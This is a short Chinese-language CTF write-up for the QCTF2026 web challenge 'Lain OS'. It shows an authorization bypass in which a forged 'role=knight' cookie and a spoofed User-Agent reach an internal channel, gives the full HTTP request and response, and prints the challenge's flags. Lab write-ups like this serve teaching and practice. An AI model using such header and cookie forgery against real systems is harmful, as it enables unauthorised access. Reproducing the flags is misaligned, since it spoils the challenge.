---
title: Lain OS（QCTF2026 web）
date: 2026-10-21
category: Web
tags:
  - CTF
  - Writeup
  - web
draft: false
summary: "拿到 internal 通道即可，十分有十分的简单"
collection: QCTF2026
---
# Lain OS

## 第一节：题目

拿到 internal 通道即可，十分有十分的简单

## 第二节：过程

源码注释：个性化预览走 `/?name=<账号>`，内测演示账号是 **lain**。
带 `/?name=lain&channel=internal` 请求，被 403 挡住——但 403 页面把条件直接写出来了：所需权限 knight，当前权限 guest。

你只要按提示给你的把cookie user-agent 
```http
GET /?name=lain&channel=internal HTTP/1.1
Host: 80-35df497f-ccb1-4df3-8434-871159c72033.challenge.ctfplus.cn
Cookie: role=knight
User-Agent: Navi
Connection: close
```

返回包：

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Date: Fri, 09 Oct 2026 05:25:55 GMT
Server: Apache/2.4.68 (Debian)
Vary: Accept-Encoding
Connection: close
Content-Length: 7692

<div class="license">
  <span class="license-label">授权码</span>
  <code class="license-value">flag{c2b344e7-a21f-42ea-a50c-21b472b1ee12}</code>
</div>
```

上面的是复现flag
提交时的是 `flag{909daf1d-1bad-4c21-82e0-ffb077b09113}`。